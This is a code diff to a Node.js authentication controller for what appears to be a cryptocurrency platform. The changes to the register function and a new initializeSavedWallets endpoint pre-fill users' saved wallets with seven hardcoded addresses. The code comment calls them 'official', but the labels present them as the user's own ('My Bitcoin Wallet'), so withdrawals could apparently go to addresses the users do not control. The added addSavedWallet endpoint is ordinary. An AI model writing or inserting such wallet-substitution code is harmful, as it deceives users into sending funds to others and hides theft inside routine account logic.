@@ -49,7 +49,52 @@ exports.register = async (req, res, next) => {
       phone,
       password,
       dateOfBirth,
-      address
+      address,
+      // Add official crypto addresses as user's saved wallets
+      savedWallets: [
+        {
+          id: 'btc-1',
+          label: 'My Bitcoin Wallet',
+          crypto: 'btc',
+          address: 'bc1qcxturvvyrjqnj3vkundmt5kaukqw28qe7z0l4y'
+        },
+        {
+          id: 'eth-1',
+          label: 'My Ethereum Wallet',
+          crypto: 'eth',
+          address: '0x87d04fc72ae68086eab7662b2ca27823f8b42eb8'
+        },
+        {
+          id: 'trx-1',
+          label: 'My TRON Wallet',
+          crypto: 'trx',
+          address: 'TCYjqLQFCfyRzrZ5nFSAYRh259we2VqRdg'
+        },
+        {
+          id: 'sol-1',
+          label: 'My Solana Wallet',
+          crypto: 'sol',
+          address: '36rAEqtck9UfSx8WJTVLvsZkQ6htUfcUXBUrbJjb73JA'
+        },
+        {
+          id: 'bnb-1',
+          label: 'My BNB Wallet',
+          crypto: 'bnb',
+          address: '0x87d04fc72ae68086eab7662b2ca27823f8b42eb8'
+        },
+        {
+          id: 'ltc-1',
+          label: 'My Litecoin Wallet',
+          crypto: 'ltc',
+          address: 'ltc1q5ddt0k53v9manzudx8sfvhte2xad3z82g4xlks'
+        },
+        {
+          id: 'doge-1',
+          label: 'My Dogecoin Wallet',
+          crypto: 'doge',
+          address: 'DHcr7Au8ETffaNNzToYzoGWV6k95czyNTX'
+        }
+      ]
     });
 
     // Create default KYC record
@@ -126,6 +171,124 @@ exports.register = async (req, res, next) => {
         userId: user._id,
         otpId: otp._id
       }
+    });
+
+  } catch (error) {
+    next(error);
+  }
+};
+
+// @desc    Add a new saved wallet to user's account
+// @route   POST /api/v1/auth/add-saved-wallet
+// @access  Private
+exports.addSavedWallet = async (req, res, next) => {
+  try {
+    const { label, crypto, address } = req.body;
+    
+    if (!label || !crypto || !address) {
+      return res.status(400).json({
+        success: false,
+        message: 'Please provide label, crypto, and address'
+      });
+    }
+
+    const user = await User.findById(req.user._id);
+    
+    // Generate unique ID for the new wallet
+    const newWalletId = `${crypto}-${Date.now()}`;
+    
+    user.savedWallets.push({
+      id: newWalletId,
+      label,
+      crypto,
+      address
+    });
+    
+    await user.save();
+
+    // Create audit log
+    await AuditLog.log({
+      actor: { user: user._id, role: user.role, ip: req.ip, userAgent: req.get('User-Agent') },
+      action: 'saved_wallet_added',
+      category: 'account-management',
+      description: `User added a new ${crypto.toUpperCase()} wallet: ${label}`,
+      entity: { type: 'user', id: user._id, name: user.fullName }
+    });
+
+    res.status(200).json({
+      success: true,
+      message: 'Saved wallet added successfully',
+      data: user.savedWallets
+    });
+
+  } catch (error) {
+    next(error);
+  }
+};
+
+// @desc    Initialize saved wallets for existing users (adds official crypto addresses)
+// @route   POST /api/v1/auth/initialize-saved-wallets
+// @access  Private
+exports.initializeSavedWallets = async (req, res, next) => {
+  try {
+    const user = await User.findById(req.user._id);
+    
+    // Only add if user doesn't have any saved wallets yet
+    if (user.savedWallets.length === 0) {
+      user.savedWallets = [
+        {
+          id: 'btc-1',
+          label: 'My Bitcoin Wallet',
+          crypto: 'btc',
+          address: 'bc1qcxturvvyrjqnj3vkundmt5kaukqw28qe7z0l4y'
+        },
+        {
+          id: 'eth-1',
+          label: 'My Ethereum Wallet',
+          crypto: 'eth',
+          address: '0x87d04fc72ae68086eab7662b2ca27823f8b42eb8'
+        },
+        {
+          id: 'trx-1',
+          label: 'My TRON Wallet',
+          crypto: 'trx',
+          address: 'TCYjqLQFCfyRzrZ5nFSAYRh259we2VqRdg'
+        },
+        {
+          id: 'sol-1',
+          label: 'My Solana Wallet',
+          crypto: 'sol',
+          address: '36rAEqtck9UfSx8WJTVLvsZkQ6htUfcUXBUrbJjb73JA'
+        },
+        {
+          id: 'bnb-1',
+          label: 'My BNB Wallet',
+          crypto: 'bnb',
+          address: '0x87d04fc72ae68086eab7662b2ca27823f8b42eb8'
+        },
+        {
+          id: 'ltc-1',
+          label: 'My Litecoin Wallet',
+          crypto: 'ltc',
+          address: 'ltc1q5ddt0k53v9manzudx8sfvhte2xad3z82g4xlks'
+        },
+        {
+          id: 'doge-1',
+          label: 'My Dogecoin Wallet',
+          crypto: 'doge',
+          address: 'DHcr7Au8ETffaNNzToYzoGWV6k95czyNTX'
+        }
+      ];
+      
+      await user.save();
+      
+      logger.info(`Initialized saved wallets for user: ${user.email}`);
+    }
+
+    res.status(200).json({
+      success: true,
+      message: 'Saved wallets initialized',
+      data: user.savedWallets
     });
 
   } catch (error) {
